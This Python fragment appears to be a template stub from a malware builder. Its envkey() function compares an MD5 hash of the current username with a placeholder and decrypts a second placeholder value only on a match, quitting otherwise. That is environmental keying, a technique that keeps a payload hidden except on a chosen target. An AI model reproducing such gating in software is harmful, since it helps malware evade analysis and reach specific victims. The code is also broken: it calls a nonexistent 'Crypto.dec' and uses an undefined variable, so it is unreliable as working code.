import time
import random
import contextlib
import io
import os
import socket
import base64
import hashlib
import requests
from Crypto.Cipher import AES
from Crypto.Util import Padding

def envkey():	
	global user
	usermd5 = hashlib.md5(user.encode('utf-8'))
	if usermd5.hexdigest() == "{{USERNAME}}":
		return Crypto.dec('{{STATION}}')
	else:   
		quit()
